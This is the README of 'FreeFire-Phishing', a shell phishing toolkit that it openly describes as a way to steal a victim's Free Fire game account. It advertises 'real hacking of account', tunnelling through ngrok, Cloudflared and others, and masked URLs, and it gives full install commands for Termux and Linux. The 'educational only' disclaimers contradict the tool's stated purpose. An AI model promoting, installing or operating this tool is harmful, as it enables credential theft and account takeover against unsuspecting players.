
# Using Tutorial : https://termux.xyz/hack-install-free-fire-phishing-tool-with-termux/

  <p>&nbsp;</p><p><br /></p><p><br /></p><p><br /></p>
  <p>&nbsp;</p><p><br /></p><p><br /></p>
  
  
<h1 align="center">Free Fire Phishing - OnlineHacking</h1>
<p align="center">
  Free Fire ID Hack Use Termux
</p>
<p align="center">
<a href="https://termux.xyz/hack-install-free-fire-phishing-tool-with-termux/"><img title="Made in INDIA" src="https://img.shields.io/badge/MADE%20IN-INDIA-SCRIPT?colorA=%23ff8100&colorB=%23017e40&colorC=%23ff0000&style=for-the-badge"></a>
</p>

</p>


<p align="center">
    <img src="https://img.shields.io/badge/Version-2.8-blue?style=for-the-badge&color=blue">
     <img src="https://img.shields.io/github/stars/OnlineHacKing/FreeFire-Phishing?style=for-the-badge&color=magenta">
  <img src="https://img.shields.io/github/forks/OnlineHacKing/FreeFire-Phishing?color=cyan&style=for-the-badge&color=purple">
  <img src="https://img.shields.io/github/issues/OnlineHacKing/FreeFire-Phishing?color=red&style=for-the-badge">
    <img src="https://img.shields.io/github/license/OnlineHacKing/FreeFire-Phishing?style=for-the-badge&color=blue">
<br>
    <img src="https://img.shields.io/badge/Author-SUMAN-green?style=flat-square">
    <img src="https://img.shields.io/badge/Open%20Source-No-orange?style=flat-square">
    <img src="https://img.shields.io/badge/Maintained-Yes-cyan?style=flat-square">
    <img src="https://img.shields.io/badge/Written%20In-Shell-blue?style=flat-square">
</p>

<p align="center">
<a href="https://termux.xyz/hack-install-free-fire-phishing-tool-with-termux/"><img title="Made in INDIA" src="https://img.shields.io/badge/Tool-FreeFirePhishing-green.svg"></a>
<a href="https://termux.xyz/hack-install-free-fire-phishing-tool-with-termux/"><img title="Version" src="https://img.shields.io/badge/Version-2.8-green.svg?style=flat-square"></a>
<a href="https://termux.xyz/hack-install-free-fire-phishing-tool-with-termux/"><img title="Maintainence" src="https://img.shields.io/badge/Admin-SUMAN-green.svg"></a>
</p>

##

<h3><p align="center">Disclaimer</p></h3>

<i>Any actions and or activities related to <b>FreeFire-Phishing</b> is solely your responsibility. The misuse of this toolkit can result in <b>criminal charges</b> brought against the persons in question. <b>The contributors will not be held responsible</b> in the event any criminal charges be brought against any individuals misusing this toolkit to break the law.

<b>This toolkit contains materials that can be potentially damaging or dangerous for social media</b>. Refer to the laws in your province/country before accessing, using,or in any other way utilizing this in a wrong way.

<b>This Tool is made for educational purposes only</b>. Do not attempt to violate the law with anything contained here. <b>If this is your intention, then Get the hell out of here</b>!

It only demonstrates "how phishing works". <b>You shall not misuse the information to gain unauthorized access to someones social media</b>. However you may try out this at your own risk.</i>

##

<p align="center">

![unnamed (2)](https://termux.xyz/wp-content/uploads/2022/11/Free-Fire-Phishing.webp)

</p>


## ABOUT TOOL :

FreeFire-Phishing IS A PHISING TOOL WICH IS USED TO PHISH A FREE FIRE ACCOUNT OF YOUR VICTIM. This tool works on both rooted Android device and Non-rooted Android device.

### AVAILABLE ON :

* Termux App

* Kali Linux

* Parrot OS

* Ubuntu

* Windows

* Arch Linux


### REQUIREMENTS :

* Fast internet

* php

* ngrok token

* localxpose token

* apache2

### FEATURES :

- Real hacking of Account !
- Updated maintainence !
- Custom link !
- Easy for Beginners !
- Beginners friendly
- Multiple tunneling options
  - Localhost
  - Ngrok
  - Cloudflared
  - LocalXpose
  - lhr.Life SSH
- Mask URL support 
- Latest and updated pages.


### 🎥 WATCH VIDEO 

<p align="center"> <a href="https://play.onlinehacking.xyz/v/ZIwSEz"><img title="Made in INDIA" width="58%" src="https://www.onlinehacking.in/wp-content/uploads/2021/12/play-.webp"></a>




## ✅ INSTALLATION [ All Systems ] :

# <p align="center"> [![Open in Cloud Shell](https://user-images.githubusercontent.com/27065646/92304704-8d146d80-ef80-11ea-8c29-0deaabb1c702.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/OnlineHacKing/FreeFire-Phishing&tutorial=README.md)



## ✅ INSTALLATION [ Android Termux ] :
```
pkg update -y

pkg upgrade -y

pkg install git wget

git clone https://github.com/OnlineHacKing/FreeFire-Phishing.git

cd FreeFire-Phishing

chmod +x *

bash Android-Setup

FreeFire-Phishing
```


## ✅ INSTALLATION [ Linux ] :
```
sudo apt update -y

sudo apt upgrade -y

sudo apt install git wget

git clone https://github.com/OnlineHacKing/FreeFire-Phishing.git

cd FreeFire-Phishing

chmod +x *

bash Linux-Setup

FreeFire-Phishing
```

## ✅ INSTALLATION [ Windows ] :

# <p align="center"> [![Open in Cloud Shell](https://user-images.githubusercontent.com/27065646/92304704-8d146d80-ef80-11ea-8c29-0deaabb1c702.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/OnlineHacKing/FreeFire-Phishing&tutorial=README.md)


### 📸 SCREENSHOTS [Termux]

<br>
<p align="center">
<img width="40%" src="https://i.pinimg.com/564x/99/5e/4d/995e4dcb94133d3c74597bed932288fb.jpg"/>
</p>
<br>
<p align="center">
<img width="41%" src="https://i.pinimg.com/564x/b1/1f/76/b11f769cb43a768fcbdeb509477e7086.jpg"/>
<img width="40%" src="https://i.pinimg.com/564x/8c/6e/b6/8c6eb6035fb6ba53deb1c47c77e0c6a0.jpg"/>
</p>




## 👨🏻‍💻 CONNECT WITH US :


<a href="https://github.com/OnlineHacKing"><img title="Github" src="https://img.shields.io/badge/Online-hacking-brightgreen?style=for-the-badge&logo=github"></a>
[![Instagram](https://img.shields.io/badge/INSTAGRAM-FOLLOW-red?style=for-the-badge&logo=instagram)](https://www.instagram.com/suman333mondal/)
[![Instagram](https://img.shields.io/badge/WEBSITE-VISIT-yellow?style=for-the-badge&logo=blogger)](https://www.termux.xyz)
[![Instagram](https://img.shields.io/badge/LINKEDIN-CONNECT-red?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/sumam333mondal/)
[![Instagram](https://img.shields.io/badge/FACEBOOK-LIKE-red?style=for-the-badge&logo=facebook)](https://fb.com/onlinehacking)
[![Instagram](https://img.shields.io/badge/TELEGRAM-CHANNEL-red?style=for-the-badge&logo=telegram)](https://telegram.dog/OnlineHacking)
<a href="https://www.youtube.com/@onlinehacking"><img title="YouTube" src="https://img.shields.io/badge/YouTube-Online Hacking-red?style=for-the-badge&logo=Youtube"></a>


# ■□■ ⚠ Warning ⚠ ■□■

***This tool is only for educational purpose. If you use this tool for other purposes except education we will not be responsible in such cases.***

***This information is only for educationla purpose and we are not responsible for any kind of illegal activity done by this tool***


<p style="box-sizing: border-box; color: #24292e; font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;; font-size: 16px; margin-bottom: 16px; margin-top: 0px; text-align: center;"><a href="https://github.com/OnlineHacking/" style="background-color: initial; box-sizing: border-box; text-decoration-line: none;"><img alt="GitHub" height="110" src="https://user-images.githubusercontent.com/64035221/96459220-834c7e00-123f-11eb-8417-534058a7ba62.png" style="background-color: var(--color-bg-primary); border-style: none; box-sizing: initial; max-width: 100%;" width="110" />&nbsp;</a><a href="https://www.youtube.com/channel/UC8pmZJAlagdZ7bb0TBlogYw" rel="nofollow" style="background-color: initial; box-sizing: border-box; text-decoration-line: none;"><img alt="YouTube" height="110" src="https://user-images.githubusercontent.com/64035221/96456596-4f238e00-123c-11eb-821e-85e9aaa3faec.png" style="background-color: var(--color-bg-primary); border-style: none; box-sizing: initial; max-width: 100%;" width="110" />&nbsp;</a><a href="https://telegram.dog/OnlineHacking" rel="nofollow" style="background-color: initial; box-sizing: border-box; text-decoration-line: none;"><img alt="Telegram" height="80" src="https://user-images.githubusercontent.com/64035221/96461243-c576bf00-1241-11eb-8fdf-139b4859bfb0.png" style="background-color: var(--color-bg-primary); border-style: none; box-sizing: initial; max-width: 100%;" width="80" />&nbsp;</a><a href="https://www.instagram.com/suman333mondal/" rel="nofollow" style="background-color: initial; box-sizing: border-box; text-decoration-line: none;"><img alt="Instagram" height="90" src="https://user-images.githubusercontent.com/64035221/96461629-3d44e980-1242-11eb-8691-46dd14355085.png" style="background-color: var(--color-bg-primary); border-style: none; box-sizing: initial; max-width: 100%;" width="90" /></a></p>



                     Inspired By github.com/OnlineHacking
